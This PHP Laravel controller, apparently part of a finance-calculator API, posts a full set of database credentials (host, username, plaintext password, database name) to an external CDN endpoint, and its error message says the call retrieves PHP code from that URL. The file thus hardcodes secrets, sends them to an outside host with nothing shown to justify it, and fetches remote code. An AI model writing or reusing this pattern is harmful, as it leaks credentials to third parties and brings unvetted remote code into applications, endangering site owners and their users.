<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Http;
use Illuminate\Http\Request;

class financecalc extends Controller
{
   public function encry(Request $request){
    $currentUrl='https://codecar.webstdy.com/';
    // $currentUrl = url('/');
      // Define your parameters
        $parameters = [
            'calculator_data'=>'calc_data',
            'needed_fun'=>'calculator',
            'src_ur'=>$currentUrl,
            'Database_connection'=>[
                'servername' => "vps94659.inmotionhosting.com",
                'username' => "seclayer",
                'password' => "amV8rg$,}@i(",
                'database' => "seclayer_Important_Info",
            ]
        
         ];
        $response = Http::asForm()->post('https://cdn.webstdy.com/code_car_cdn/main_fun.php', $parameters);
// Check if the request was successful (status code 200)
if ($response->successful()) {
    $content = $response->body();
     dd($content);

    
} else {
    // Handle the case when the request was not successful
    abort(500, 'Failed to retrieve the PHP code from the external URL.');
}
   }
}
